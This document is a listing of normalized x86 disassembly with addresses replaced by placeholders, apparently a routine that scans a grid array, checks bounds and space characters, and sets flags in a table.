lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ebx [ rw-data ]
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ebx [ rw-data ]
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
lea ecx [ ebx + 0x1 ]
cmp ecx 0x9
jg r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ rw-data ]
lea ecx [ ebx + 0x1 ]
cmp ecx 0x6
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 ] 0x1
mov edi [ rw-data ]
mov [ edx + ecx * 4 ] 0x1
mov ebx [ rw-data ]
mov [ rw-data ] 0x1
jmp r-xdata
inc edi
add ecx 0x4
cmp edi ebx
jl r-xdata
mov edi [ rw-data ]
lea ecx [ ebx + 0x1 ]
cmp ecx 0x6
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
mov ebx [ rw-data ]
mov edi [ rw-data ]
mov [ edx + ecx * 4 + 0x800 ] 0x1
mov [ rw-data ] 0x1
jmp r-xdata
inc edi
add ecx 0x4
cmp edi ebx
jl r-xdata
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x4
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
inc ecx
cmp ecx 0xa
jg r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x4
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
inc ecx
cmp ecx 0x3
jg r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
add ecx 0x2
cmp ecx 0xa
mov ecx [ rw-data ]
jg r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x2c ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
add ecx 0x2
cmp ecx 0x5
mov ecx [ rw-data ]
jg r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x2c ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx [ rw-data ]
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
add ecx [ ebp - 0xc ]
cmp [ ebx + ecx * 4 ] 0x20
jne r-xdata
lea ecx [ ebx + 0x1 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
cmp ecx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ebx 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx [ rw-data ]
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
add ecx [ ebp - 0x4 ]
cmp [ ebx + ecx * 4 ] 0x20
jne r-xdata
lea ecx [ ebx + 0x1 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
cmp ecx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ebx 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x4 ] ecx
cmp ebx 0x9
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x4 ] ecx
cmp ebx 0x9
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] 0x0
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x8 ] ecx
cmp ebx 0x9
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] 0x0
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x8 ] ecx
cmp ebx 0x9
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
lea ecx [ ebx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
lea ecx [ ebx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov edi [ rw-data ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 ] 0x1
cmp [ ecx ] 0x20
jne r-xdata
lea ecx [ ebx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi + 0x40 ]
mov edi [ rw-data ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
cmp [ ecx ] 0x20
jne r-xdata
cmp ebx 0x8
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x1
jmp r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x6
mov esi [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
cmp [ esi + ecx * 4 - 0x2c ] 0x20
mov esi [ ebp + 0x14 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x1
jmp r-xdata
mov esi [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
cmp [ esi + ecx * 4 - 0x2c ] 0x20
mov esi [ ebp + 0x14 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx [ rw-data ]
mov ebx [ rw-data ]
inc ecx
add ebx 0xfffffffe
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ecx 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ ebx + ebx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov ebx [ rw-data ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx [ rw-data ]
mov ebx [ rw-data ]
inc ecx
add ebx 0xfffffffe
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ecx 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ ebx + ebx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov ebx [ rw-data ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop [ eax ] eax
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop [ eax + eax ] eax
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ebx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov ecx [ ebx + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 ] 0x1
mov ebx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov ecx [ ebx + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
jl r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x34 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0x8 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0x8 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x1
jl r-xdata
cmp ebx 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 - 0x4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
jmp r-xdata
cmp ebx 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 - 0x4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0xc ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
cmp ebx 0xa
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
cmp ebx 0xa
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x8 ] ecx
cmp ebx 0xa
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x8 ] ecx
cmp ebx 0xa
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
jmp r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ edx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
